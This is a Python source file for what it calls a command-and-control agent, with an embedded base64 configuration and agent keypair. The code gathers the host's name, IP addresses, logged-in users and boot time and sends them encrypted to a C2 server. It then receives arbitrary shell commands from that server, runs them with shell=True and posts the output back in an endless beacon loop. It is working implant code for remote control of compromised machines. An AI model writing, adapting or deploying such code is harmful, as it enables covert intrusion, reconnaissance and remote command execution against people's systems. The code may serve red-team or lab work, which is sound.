"""
Main agent implementation - handles C2 communication and task execution
"""
import json
import time
import socket
import platform
import subprocess
import requests
import uuid
import base64
from datetime import datetime
from typing import Dict, Any, Optional, Tuple
from crypto import encrypt, decrypt

# Static base64-encoded configuration data (528 bytes total)
# This will be replaced during agent configuration
CONFIG_B64 = "nULNhMUXxgelPhJgBUmdkblug98UYPc/4sx2tB9weXsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM0QgnCsmUB2fpJLGYhBBGea9lx4jJXZpCugs1EVFQTcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB7InNlcnZlcl91cmwiOiAiaHR0cDovL2xvY2FsaG9zdDo4MDgwIiwgImRlcGxveV9pZCI6ICJhZ2VudDAwMSIsICJjYWxsYmFja19pbnRlcnZhbCI6IDMwLCAiYzJfcHVibGljX2tleSI6ICI0ZDJjYTE5N2U4MTNjZWViMWI3ZmQ0MzQ2MTI5NWNmZThmZGM5NDIyY2ViOTY4NjE2ZDRjMjQ2YzEyNTczZTQyIn0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

CONFIG_SIZE = 528
KEYPAIR_SIZE = 128
MAX_JSON_SIZE = 400

def load_config(config_data: bytes) -> Tuple[bytes, bytes, Dict[str, Any]]:
    """Load and parse agent configuration"""
    if len(config_data) != CONFIG_SIZE:
        raise ValueError(f"Invalid configuration size: {len(config_data)} != {CONFIG_SIZE}")
    
    # Extract keypair (first 128 bytes)
    agent_public_key = config_data[:64].rstrip(b'\x00')
    agent_private_key = config_data[64:128].rstrip(b'\x00')
    
    # Extract and parse JSON (remaining 400 bytes)
    json_data = config_data[128:].rstrip(b'\x00')
    config_dict = json.loads(json_data.decode('utf-8'))
    
    # Convert c2_public_key back from hex
    config_dict['c2_public_key'] = bytes.fromhex(config_dict['c2_public_key'])
    
    return agent_public_key, agent_private_key, config_dict

def get_static_config() -> Tuple[bytes, bytes, Dict[str, Any]]:
    """Get configuration from static base64 string"""
    config_data = base64.b64decode(CONFIG_B64)
    return load_config(config_data)

def get_system_info() -> Dict[str, Any]:
    """Collect system information for beacon"""
    hostname = socket.gethostname()
    
    # Get internal IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        internal_ip = s.getsockname()[0]
        s.close()
    except Exception:
        internal_ip = "unknown"
    
    # Get external IP
    try:
        external_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except Exception:
        external_ip = "unknown"
    
    # Get users
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["query", "user"], capture_output=True, text=True)
            users = result.stdout.strip() if result.returncode == 0 else "unknown"
        else:
            result = subprocess.run(["who"], capture_output=True, text=True)
            users = result.stdout.strip() if result.returncode == 0 else "unknown"
    except Exception:
        users = "unknown"
    
    # Get boot time
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["systeminfo"], capture_output=True, text=True)
            boot_time = "unknown"  # Would need to parse systeminfo output
        else:
            result = subprocess.run(["uptime", "-s"], capture_output=True, text=True)
            boot_time = result.stdout.strip() if result.returncode == 0 else "unknown"
    except Exception:
        boot_time = "unknown"
    
    return {
        "ip": internal_ip,
        "external_ip": external_ip,
        "hostname": hostname,
        "os": platform.system(),
        "arch": platform.machine(),
        "users": users,
        "boottime": boot_time,
        "deploy_id": None  # Will be set by caller
    }

def execute_command(command: str) -> str:
    """Execute system command and return output"""
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=30
        )
        output = result.stdout
        if result.stderr:
            output += f"\nSTDERR: {result.stderr}"
        if result.returncode != 0:
            output += f"\nReturn code: {result.returncode}"
        return output
    except subprocess.TimeoutExpired:
        return "Command timed out after 30 seconds"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def send_beacon(server_url: str, deploy_id: str, agent_private_key: bytes, c2_public_key: bytes) -> Optional[Dict[str, Any]]:
    """Send beacon to C2 server and get task using GET with agent ID and encrypted status"""
    system_info = get_system_info()
    system_info["deploy_id"] = deploy_id
    
    beacon_data = json.dumps(system_info).encode('utf-8')
    encrypted_beacon = encrypt(beacon_data, c2_public_key, agent_private_key)
    
    # Encode encrypted status as base64 for URL parameter
    encoded_status = base64.b64encode(encrypted_beacon).decode('ascii')
    
    try:
        response = requests.get(
            f"{server_url}/beacon",
            params={
                "id": deploy_id,
                "status": encoded_status
            },
            timeout=10
        )
        
        if response.status_code == 200 and response.content:
            # Decrypt response
            decrypted_data = decrypt(response.content, agent_private_key, c2_public_key)
            if decrypted_data:
                return json.loads(decrypted_data.decode('utf-8'))
    except Exception as e:
        print(f"Beacon failed: {e}")
    
    return None

def send_task_result(server_url: str, task_result: Dict[str, Any], agent_private_key: bytes, c2_public_key: bytes) -> None:
    """Send task execution result back to C2 with base64 encoding"""
    # Base64 encode the result data before encryption
    result_json = json.dumps(task_result)
    result_b64 = base64.b64encode(result_json.encode('utf-8')).decode('ascii')
    encrypted_result = encrypt(result_b64.encode('utf-8'), c2_public_key, agent_private_key)
    
    try:
        requests.post(
            f"{server_url}/result",
            data=encrypted_result,
            headers={"Content-Type": "application/octet-stream"},
            timeout=10
        )
    except Exception as e:
        print(f"Result send failed: {e}")

def main_loop() -> None:
    """Main agent loop"""
    # Load configuration from static base64 string
    agent_public_key, agent_private_key, config = get_static_config()
    
    server_url = config['server_url'].rstrip('/')
    deploy_id = config['deploy_id']
    callback_interval = config['callback_interval']
    c2_public_key = config['c2_public_key']
    
    print(f"Agent started - Deploy ID: {deploy_id}")
    print(f"Server: {server_url}")
    print(f"Callback interval: {callback_interval}s")
    
    while True:
        try:
            # Send beacon and get task
            task = send_beacon(server_url, deploy_id, agent_private_key, c2_public_key)
            
            if task:
                print(f"Received task: {task['task_id']}")
                
                # Execute command
                output = execute_command(task['task_arg'])
                
                # Send result
                result = {
                    "task_id": task['task_id'],
                    "task_num": task['task_num'],
                    "task_arg": task['task_arg'],
                    "output": output,
                    "timestamp": datetime.now().isoformat()
                }
                
                send_task_result(server_url, result, agent_private_key, c2_public_key)
                print(f"Task {task['task_id']} completed")
            
        except Exception as e:
            print(f"Agent error: {e}")
        
        time.sleep(callback_interval)

if __name__ == "__main__":
    main_loop()